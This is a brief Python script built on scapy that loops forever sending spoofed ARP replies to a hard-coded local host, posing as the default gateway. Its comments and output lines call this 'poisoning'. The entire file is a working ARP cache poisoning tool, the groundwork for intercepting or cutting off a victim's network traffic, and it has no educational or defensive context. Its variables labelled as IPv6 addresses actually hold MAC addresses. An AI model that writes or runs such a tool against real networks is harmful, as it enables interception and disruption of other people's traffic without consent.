import signal, sys
from scapy.all import *

def main():
	ip_to_infect = "10.67.101.104" # input("Ip to infect\n")
	ip_to_infect_v6 = "48:0f:cf:42:a2:43" # input("Ip(v6) to infect\n")
	default_gateway = "10.67.101.254"
	my_ip_v6 = "48:0f:cf:47:0d:30"
	poison_packet = ARP(hwsrc=my_ip_v6,hwdst=ip_to_infect_v6, pdst=ip_to_infect,psrc=default_gateway, op=2)
	print("[+] Poisoning %s" % (ip_to_infect))
	count = 0
	signal.signal(signal.SIGINT, end)
	while True:
		count += 1
		sr1(poison_packet, timeout=1, verbose=False)
		print("[+] Poisoning going on... #%s." % (count))

def end(sig, frame):	
	print("Ending poisoning...")
	sys.exit(0)

if __name__ == "__main__":
	main()